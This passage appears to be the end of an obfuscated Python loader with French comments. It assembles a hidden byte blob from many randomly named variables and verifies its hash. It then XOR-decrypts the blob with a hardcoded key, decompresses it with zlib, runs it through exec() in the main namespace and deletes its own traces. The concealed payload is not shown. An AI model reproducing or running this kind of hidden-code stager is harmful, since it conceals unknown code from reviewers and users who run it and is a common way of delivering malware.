_cifihQmbZaOkkr + _cinVOvtSImLsi8 + _clvMTzEH02HxZK + _cpXx99EvXxa8TD + _csxQhMDrw9AZb9 + _cpFnI2t3_cBjcv + _cjf5q6FfW9a_Ud + _copR0QG1QRwiFm + _cdrcpJSEdVg6Mj + _czPZhUI4R67lUv + _cnlCl5U5K8yUo2 + _coQ6I7CkmE_Gqq + _cooHmE2PtmbivD + _cnXajWhrBowc6H + _cgjLuA9Tib8q6R + _cj_RpN8snP7WMl + _cmfDsCMWrs_FSn + _cmPQx3hk26K2zG + _cmz_rXUlWboH4v + _cfanRw2w11kgxb + _ct9wTg2ceK4eTF + _c_2Wa5aLk8eUro + _cfTHMZpRqpyLUr + _cxTdCHvoDA6xwk + _cly_2OhRxvvHL5 + _crN9abnPS4updY + _ci7eMUUuLij2BA + _cnhVoIZgA7kNQx + _caCq9gBXjF1rcP + _cuvmIjRGQRHvWx + _csc0pdquYkbemx + _cwddcO7Nvn5_zW + _csyOLI9iQ1HlH4 + _cc_grLo9R0Ugrz + _coE0h1JGGK5jsg + _ck0P5RriEweT7a + _cq7iJ1voJC25rf + _cpRO_9zNemudZJ + _cjr5IKQNGmbhKm + _cjGGuar25gGcDG + _cqAR5ETVs_qpNz + _cbu5OvB9tpocKf + _cjiuVc0nVHxFqC + _cdts5yxI7JKLHB + _cwZd3z3nxcW6RM + _cwqht1rBNTZV57 + _clXAfFVWbhq0Or + _czy1MmMPcdxPAW + _cfEz2KLr3_XIOG + _crT0YNgkjffpog + _cjLjU6VznGrWBJ + _ci7CGPyuTBg_f3 + _cthe1DovMM1h7i + _cvr1jFJUJwR4it + _czsIc27ctk5A82 + _cmGZLzRNiicaTm + _cz8FK9wAMbWrlK + _cdsfeoe219_WN4 + _cdmP9uSqwAE_Qp + _cgLWZEYA2idVlw + _cmvm8Kp_uMyVnn + _crwPK_DlCzBg2M + _csHuNNnLpTHfLt + _cfMmthThnSpKsH + _cjJzPI5WlZnwkM + _cfYb_ileslRYdb + _cs_BoWUcSm_J61 + _coGbukB4wEff_x + _cgi_q1DoVt62NU + _ca_D3pAS08gUo1 + _cnJSvI6e896yj2)
if __import__('hashlib').sha256(_ppMY8hDzZ8KKS6).hexdigest() != '1dcc819dc06c0b7a68aaa3ac6fe8b6188e473aa768d18c6d293d046b288603f6':
    __import__('sys').exit(1)
_xcSlcGSxAFmpCE = bytes([60, 111, 118, 178, 234, 40, 169, 223, 104, 210, 200, 77, 194, 187, 188, 246, 232, 236, 241, 78, 50, 81, 86, 191, 49, 167, 229, 230, 140, 35, 158, 197])
_fkqZMajjLWQKY9N = bytes([104, 31, 136, 250, 109, 99, 192, 55, 138, 67, 111, 93, 166, 102, 37, 192, 189, 214, 34, 44, 226, 154, 65, 86, 107, 73, 40, 149, 69, 193, 82, 227])

def _fxvcj8A5cOj8k7L(_btt7VB39LyiZol, _keGfwi3gEgSAc7):
    return bytes(_btt7VB39LyiZol[_izz8czPVAxJ7WE] ^ _keGfwi3gEgSAc7[_izz8czPVAxJ7WE % len(_keGfwi3gEgSAc7)] for _izz8czPVAxJ7WE in range(len(_btt7VB39LyiZol)))

def _fdh6aWmBajECcEg(_tbsd4tsz9EU5sS):
    import zlib
    return zlib.decompress(_tbsd4tsz9EU5sS) # Un seul niveau de zlib ici pour simplifier

def _feamy2ztN0e4PZF():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xc877UK64mKdro = _fxvcj8A5cOj8k7L(_ppMY8hDzZ8KKS6, _xcSlcGSxAFmpCE)
    # 2. Décompression Zlib
    _diDg87CjKrPWA_ = _fdh6aWmBajECcEg(_xc877UK64mKdro)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _diDg87CjKrPWA_.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nuBw_lINd2bbgR = _main.__dict__
    _nuBw_lINd2bbgR.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nuBw_lINd2bbgR)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feamy2ztN0e4PZF()
try:
    del _fxvcj8A5cOj8k7L, _fdh6aWmBajECcEg, _feamy2ztN0e4PZF
    del _ppMY8hDzZ8KKS6, _xcSlcGSxAFmpCE, _fkqZMajjLWQKY9N
except:
    pass
